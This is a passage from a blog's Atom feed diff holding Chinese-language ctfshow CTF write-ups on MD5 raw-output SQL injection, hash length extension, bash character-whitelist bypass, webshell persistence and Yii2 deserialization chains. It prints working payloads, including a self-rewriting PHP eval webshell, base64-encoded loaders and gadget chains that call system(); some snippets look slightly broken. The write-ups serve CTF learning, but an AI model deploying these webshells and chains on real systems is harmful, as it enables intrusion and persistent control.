+					$r = @mysqli_query($con,&quot;SELECT master FROM secret WHERE password = binary '&quot; . md5($_POST['password'], true) . &quot;'&quot;);
+					echo &quot;&lt;!--SELECT master FROM secret WHERE password = binary '&quot; . md5($_POST['password'], true) . &quot;'&quot;.&quot;--&gt;&quot;;
+
+					if (@mysqli_num_rows($r) &lt; 1)
+						echo &quot;&lt;p&gt;You are not Thanos!!&lt;/p&gt;&quot;;
+					else {
+						$row = @mysqli_fetch_assoc($r);
+
+						$login = $row['master'];
+						echo &quot;&lt;p&gt;Hi &lt;b&gt;$login&lt;/b&gt;!&lt;br/&gt;&lt;/p&gt;&quot;;
+						echo &quot;&lt;table border=1 style='margin:auto'&gt;&lt;tr&gt;&lt;th&gt;suspend code&lt;/th&gt;&lt;/tr&gt;&quot;;
+						mysqli_free_result($r);
+						$r = @mysqli_query($con,&quot;SELECT suspend_code FROM secret&quot;);
+						while ($row = @mysqli_fetch_assoc($r))
+							echo &quot;&lt;tr&gt;&lt;td&gt;{$row['suspend_code']}&lt;/td&gt;&lt;/tr&gt;&quot;;
+						echo &quot;&lt;/table&gt;&quot;;
+						mysqli_free_result($r);
+						mysqli_close($con);
+					}
+				}
+				else {
+			?&gt;
+</code></pre>
+<p>使用<code>?NOHO[]=</code>，$NOHO的值会为NULL，NULL作大小比较时都会返回false。</p>
+<p>写个php脚本爆破，使MD5后的hex数据刚好含有<code>'='</code>的hex值(273D27),即可使查询返回true。<br>
+分析：此时语句变成了SELECT master FROM secret WHERE password = 'BBB'='CCC'，假设password='AAA'，那么在执行sql查询的时候，语句的优先级是这样的：('AAA'='BBB')='CCC'<br>
+很明显'AAA'不等于'BBB'，所以'AAA'='BBB'返回0，语句变成了0='CCC',当这里的数字和字符串比较的时候，Mysql会将字符串转换为数字，这里的'CCC'被转换为0,0=0为真返回1，最后成功构造闭合sql语句，使查询返回true.</p>
+<pre><code class="language-php">&lt;?php
+for ($i = 0;$i &lt; 9e6;$i++) {
+    if (stripos(md5($i, true), &quot;'='&quot;) !== false)
+        echo &quot;md5($i) = &quot; . md5($i, true).&quot;&lt;/br&gt;&quot;;
+}
+?&gt;
+</code></pre>
+<h2 id="web698">web698</h2>
+<blockquote>
+<p>哈希长度扩展攻击</p>
+</blockquote>
+<p>参考文章<a href="https://ctf.org.cn/2019/11/19/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BB%A5%E5%8F%8AHashPump%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E5%92%8C%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE/">哈希长度扩展攻击以及HashPump安装使用和两道题目</a></p>
+<p>使用工具<a href="https://github.com/shellfeel/hash-ext-attack">hash-ext-attack</a></p>
+<pre><code class="language-php">&lt;?php
+@error_reporting(0);
+
+$flag = &quot;flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxx}&quot;;
+$secret_key = &quot;xxxxxxxxxxxxxxxx&quot;; // the key is safe! no one can know except me
+$username = $_POST[&quot;username&quot;];
+$password = $_POST[&quot;password&quot;];
+header(&quot;hash_key:&quot; . $hash_key);
+
+if (!empty($_COOKIE[&quot;getflag&quot;])) {
+    if (urldecode($username) === &quot;D0g3&quot; &amp;&amp; urldecode($password) != &quot;D0g3&quot;) {
+        if ($COOKIE[&quot;getflag&quot;] === md5($secret_key . urldecode($username . $password))) {
+            echo &quot;Great! You're in!\n&quot;;
+            die (&quot;&lt;!-- The flag is &quot;. $flag . &quot;--&gt;&quot;);
+        }
+        else {
+            die (&quot;Go out! Hacker!&quot;);
+        }
+    }
+    else {
+        die (&quot;LEAVE! You're not one of us!&quot;);
+    }
+}
+
+setcookie(&quot;sample-hash&quot;, md5($secret_key . urldecode(&quot;D0g3&quot; . &quot;D0g3&quot;)), time() + (60 * 60 * 24 * 7));
+
+if (empty($_COOKIE[&quot;source&quot;])) {
+    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));
+}
+else {
+    echo &quot;&lt;source_code&gt;&quot;;
+    }
+}
+</code></pre>
+<p>哈希扩展攻击主要是在salt未知的情况下已知md5(salt.password)===hash,我们可以构造出md5(salt.password2)===hash2,但是password2要满足一定格式，而且需要知道salt长度，这里试出来为10位（代码里明明是16个x😤）</p>
+<p><img src="https://fallingskies22.github.io/post-images/1724863785071.png" alt="" loading="lazy"><br>
+payload</p>
+<pre><code>username=D0g3&amp;password=D0g3%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00&amp;submit=submit
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://fallingskies22.github.io/post-images/1724863838707.png" alt="" loading="lazy"></figure>
+<h2 id="web699">web699</h2>
+<blockquote>
+<p>命令执行绕过</p>
+</blockquote>
+<p>设置了白名单，需要用<code>[${#}\(&lt;)'0]</code>这些字符来执行命令。</p>
+<pre><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+if(isset($_POST[&quot;cmd&quot;]))
+{
+    $test = $_POST['cmd'];
+    $white_list = str_split('${#}\\(&lt;)\'0'); 
+    $char_list = str_split($test);
+    foreach($char_list as $c){
+        if(!in_array($c,$white_list)){
+                die(&quot;Cyzcc&quot;);
+            }
+        }
+    exec($test);
+}
+?&gt;
+</code></pre>
+<p>参考文章<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">minbashmaxfun writeup</a></p>
+<pre><code>${##} - 计算变量长度 等于1
+$((expr)) - 算术表达式
+$((${##}&lt;&lt;${##})) - 1左移1位，等于2
+$((2#110)) - 二进制解析，等于6
+${!#} 执行bash（第一个参数是/bin/bash） 等同于$0
+$'\123' - 转换8进制为字符
+&lt;&lt;&lt;传入字符串
+</code></pre>
+<p>编写转换脚本</p>
+<pre><code class="language-python">
+# 八进制
+n = dict()
+n[0] = '${#}'
+n[1] = '${##}'
+n[2] = '$((${##}&lt;&lt;${##}))'
+n[3] = '$(($((${##}&lt;&lt;${##}))#${##}${##}))'
+n[4] = '$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))'
+n[5] = '$(($((${##}&lt;&lt;${##}))#${##}${#}${##}))'
+n[6] = '$(($((${##}&lt;&lt;${##}))#${##}${##}${#}))'
+n[7] = '$(($((${##}&lt;&lt;${##}))#${##}${##}${##}))'
+
+f = ''
+
+def str_to_oct(cmd):                                #命令转换成八进制字符串
+    s = &quot;&quot;
+    for t in cmd:
+        o = ('%s' % (oct(ord(t))))[2:]
+        s+='\\'+o   
+    return s
+
+def build(cmd):                                     #八进制字符串转换成字符
+    payload = &quot;$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\\\'&quot;                 #${!#}与$0等效
+    s = str_to_oct(cmd).split('\\')
+    for _ in s[1:]:
+        payload+=&quot;\\\\&quot;
+        for i in _:
+            payload+=n[int(i)]
+    return payload+'\\\''
+
+print(build('touch 1.txt'))
+
+</code></pre>
+<p>这里创建了文件，也访问不到，好像是题目有问题😇</p>
+<h2 id="参考文章">参考文章</h2>
+<p>https://blog.csdn.net/weixin_49656607/article/details/124065674、<br>
+https://blog.csdn.net/miuzzx/article/details/123064086</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[ctfshow]权限维持]]></title>
+        <id>https://fallingskies22.github.io/post/ctfshowquan-xian-wei-chi/</id>
+        <link href="https://fallingskies22.github.io/post/ctfshowquan-xian-wei-chi/">
+        </link>
+        <updated>2024-08-21T11:19:33.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="web670-web676">web670-web676</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+// 题目说明：
+// 想办法维持权限，确定无误后提交check，通过check后，才会生成flag，此前flag不存在
+
+error_reporting(0);
+highlight_file(__FILE__);
+
+$a=$_GET['action'];
+
+switch($a){
+    case 'cmd':
+        eval($_POST['cmd']);
+        break;
+    case 'check':
+        file_get_contents(&quot;http://checker/api/check&quot;);
+        break;
+    default:
+        die('params not validate');
+}
+
+</code></pre>
+<p>访问checker后具体执行操作没有代码🙃<br>
+根据其他人文章的猜测<br>
+服务器在监测到访问url后，就会写入flag，顺便删掉web目录所有文件。</p>
+<pre><code>echo 'flag{xxxx}' &gt; /flag_xx.txt
+rm -rf *
+</code></pre>
+<p>想办法维持住权限。<br>
+使用不死马，让服务器删不掉</p>
+<pre><code class="language-php">&lt;?php
+    ignore_user_abort(true);//设置客户端断开连接时是否中断脚本的执行
+    set_time_limit(0);//表示长时间链接运行，不限制运行时间
+    unlink(__FILE__);
+    $file = 'shell.php';
+    $code = '&lt;?php @eval($_POST[1]);?&gt;';
+    while (1) {
+        file_put_contents($file, $code);
+        usleep(5000);
+    }
+?&gt;
+</code></pre>
+<p>payload</p>
+<pre><code>cmd=file_put_contents('dontdie.php',base64_decode(&quot;PD9waHANCiAgICBpZ25vcmVfdXNlcl9hYm9ydCh0cnVlKTsNCiAgICBzZXRfdGltZV9saW1pdCgwKTsNCiAgICB1bmxpbmsoX19GSUxFX18pOw0KICAgICRmaWxlID0gJ3NoZWxsLnBocCc7DQogICAgJGNvZGUgPSAnPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs%2FPic7DQogICAgd2hpbGUgKDEpIHsNCiAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRjb2RlKTsNCiAgICAgICAgdXNsZWVwKDUwMDApOw0KICAgIH0NCj8%2B&quot;));
+</code></pre>
+<p>上传之后第一次访问<code>dontdie.php</code>会一直转圈，再访问就会发现文件已经不在了。<br>
+连接shell.php</p>
+<p>访问<code>?action=check</code>后，会发现shell.php依然存在。</p>
+<h2 id="web677">web677</h2>
+<h2 id="web678">web678</h2>
+<p>web目录没有写权限，无法写入不死马<br>
+突然发现已经能执行php代码了，直击执行不死马不行吗😅<br>
+前面题目的payload可以换成（没试过，但应该可以）</p>
+<pre><code>cmd=eval(base64_decode('ICAgIGlnbm9yZV91c2VyX2Fib3J0KHRydWUpOw0KICAgIHNldF90aW1lX2xpbWl0KDApOw0KICAgICRmaWxlID0gJ3NoZWxsLnBocCc7DQogICAgJGNvZGUgPSAnPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs%2FPic7DQogICAgd2hpbGUgKDEpIHsNCiAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRjb2RlKTsNCiAgICAgICAgdXNsZWVwKDUwMDApOw0KICAgIH0NCj8%2B'));
+</code></pre>
+<p>但因为不死马也是靠循环写文件实现的，所以这里还是不行。</p>
+<p>考虑使用循环命令执行或者延迟执行例如sleep，check只会删掉所有文件，而不会删掉进程</p>
+<pre><code>cmd=system('while true;do cat /f*;done');
+cmd=system('sleep 10;cat /f*');
+</code></pre>
+<p>大多数PHP环境的最大执行时间是30秒</p>
+<p>这里使用sleep方法</p>
+<p>##web679</p>
+<p>check后会关掉web服务</p>
+<p>使用<code>php -S</code>命令开启web服务</p>
+<pre><code>cmd=system('sleep 10;ls &gt; /dir;cd /;php -S 0.0.0.0:80');
+</code></pre>
+<p>把目录写入文件中，开启web服务后访问获取目录，再访问flag即可。</p>
+<h2 id="参考文章">参考文章</h2>
+<p>https://blog.csdn.net/Jayjay___/article/details/132387118<br>
+https://blog.csdn.net/miuzzx/article/details/125521430</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[ctfshow]Yii专题]]></title>
+        <id>https://fallingskies22.github.io/post/ctfshowyii-zhuan-ti/</id>
+        <link href="https://fallingskies22.github.io/post/ctfshowyii-zhuan-ti/">
+        </link>
+        <updated>2024-08-20T12:18:46.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="web636">web636</h2>
+<p>Yii2反序列化链</p>
+<p><code>RunProcess</code>-&gt;<code>ValidGenerator</code></p>
+<p>这里因为有报错信息，看不到命令执行结果，写到其他文件来查看。</p>
+<pre><code class="language-php">&lt;?php
+namespace Faker{
+    class DefaultGenerator{
+        protected $default;
+        public function __construct($cmd)
+        {
+            $this-&gt;default = $cmd;
+        }
+    }
+    class ValidGenerator
+    {
+        protected $generator;
+        protected $validator;
+        protected $maxRetries;
+        public function __construct($cmd){
+            $this-&gt;generator=new DefaultGenerator($cmd);
+            $this-&gt;maxRetries=1;
+            $this-&gt;validator='system';
+        }
+    }
+}
+
+namespace Codeception\Extension{
+    use Faker\ValidGenerator;
+    class RunProcess{
+        private $processes = [] ;
+        function __construct($cmd)
+        {
+            $this-&gt;processes[] = new ValidGenerator($cmd);
+        }
+    }
+    echo(urlencode(serialize(new RunProcess('cat /flags_c &gt; 1.txt'))));
+}
+</code></pre>
+<h2 id="web637">web637</h2>
+<p>上题链被过滤<br>
+参考<a href="https://forum.butian.net/share/666">文章</a><br>
+<code>RunProcess</code>-&gt;<code>ObjectProphecy</code>-&gt;<code>LazyDouble</code>-&gt;<code>Doubler</code>-&gt;<code>ClassCreator</code></p>
+<p>分析就略了。。。(因为最新版的RunProcess被过滤了👻)</p>
+<pre><code class="language-php">&lt;?php
+/***
+ * Created by joker
+ * Date 2021/9/7 20:02
+ ***/
+namespace Codeception\Extension;
+use Prophecy\Prophecy\ObjectProphecy;
+class RunProcess{
+    private $processes;
+    function __construct()
+    {
+        $a = new ObjectProphecy('1');
+        $this-&gt;processes[] = new ObjectProphecy($a);
+    }
+}
+echo urlencode(serialize(new RunProcess()));
+namespace Prophecy\Prophecy;
+use Prophecy\Doubler\LazyDouble;
+class ObjectProphecy{
+    private $lazyDouble;
+    private $revealer;
+    function __construct($a)
+    {
+        $this-&gt;revealer = $a;
+        $this-&gt;lazyDouble = new LazyDouble();
+    }
+}
+
+namespace Prophecy\Doubler;
+class LazyDouble{
+    private $doubler;
+    private $argument;
+    private $class;
+    private $interfaces;
+    function __construct()
+    {
+        $this-&gt;doubler =new Doubler();
+        $this-&gt;class = new \ReflectionClass('Exception');
+        $this-&gt;argument = array('fallingskies'=&gt;'fallingskies');
+        $this-&gt;interfaces[] = new \ReflectionClass('Exception');
+    }
+}
+namespace Prophecy\Doubler\Generator\Node;
+class ClassNode{
+}
+
+namespace Prophecy\Doubler;
+use Prophecy\Doubler\Generator\Node\ClassNode;
+use Faker\DefaultGenerator;
+use Prophecy\Doubler\Generator\ClassCreator;
+class Doubler{
+    private $mirror;
+    private $creator;
+    private $namer;
+    function __construct()
+    {
+        $this-&gt;namer = new DefaultGenerator('fallingskies');
+        $this-&gt;mirror = new DefaultGenerator(new ClassNode());
+        $this-&gt;creator = new ClassCreator();
+    }
+}
+
+namespace Faker;
+class DefaultGenerator{
+    protected $default;
+    function __construct($default)
+    {
+        $this-&gt;default = $default;
+    }
+}
+
+namespace Prophecy\Doubler\Generator;
+use Faker\DefaultGenerator;
+class ClassCreator{
+    private $generator;
+    function __construct()
+    {
+        $this-&gt;generator = new DefaultGenerator('system(&quot;cat /flags_c &gt; 1.txt&quot;);');
+    }
+}
+</code></pre>
+<h2 id="web638">web638</h2>
+<p>参考文章：https://blog.csdn.net/Mrs_H/article/details/119928348<br>
+https://www.anquanke.com/post/id/251366#h2-6<br>
+https://xz.aliyun.com/t/9948</p>
+<p>需要下一个<a href="https://github.com/opis/closure">闭包依赖Opis Closure</a><br>
+这条链算最复杂的一条了🤣</p>
+<p>这里主要是用闭包函数，来解决<code>call_user_func()</code>只能控制第一个参数的情况。</p>
+<pre><code class="language-php">&lt;?php
+namespace Codeception\Extension{
+    use Faker\DefaultGenerator;
+    use GuzzleHttp\Psr7\AppendStream;
+    class  RunProcess{
+        protected $output;
+        private $processes = [];
+        public function __construct(){
+            $this-&gt;processes[]=new DefaultGenerator(new AppendStream());
+            $this-&gt;output=new DefaultGenerator('fallingskies');
+        }
+    }
+    echo urlencode(serialize(new RunProcess()));
+}
+
+namespace Faker{
+    class DefaultGenerator
+    {
+        protected $default;
+
+        public function __construct($default = null)
+        {
+            $this-&gt;default = $default;
+        }
+    }
+}
+namespace GuzzleHttp\Psr7{
+    use Faker\DefaultGenerator;
+    final class AppendStream{
+        private $streams = [];
+        private $seekable = true;
+        public function __construct(){
+            $this-&gt;streams[]=new CachingStream();
+        }
+    }
+    final class CachingStream{
+        private $remoteStream;
+        public function __construct(){
+            $this-&gt;remoteStream=new DefaultGenerator(false);
+            $this-&gt;stream=new  PumpStream();
+        }
+    }
+    final class PumpStream{
+        private $source;
+        private $size=-10;
+        private $buffer;
+        public function __construct(){
+        public function __construct(){
+            $this-&gt;buffer=new DefaultGenerator('fallingskies');
+            include(&quot;closure/autoload.php&quot;);
+            $a = function(){system(&quot;cat /flags_c &gt; 1.txt&quot;);};
+            $a = \Opis\Closure\serialize($a);
+            $b = unserialize($a);
+            $this-&gt;source=$b;
+        }
+    }
+}
+</code></pre>
+<h2 id="web639">web639</h2>
+<p>同上</p>
+]]></content>
+    </entry>
+</feed>
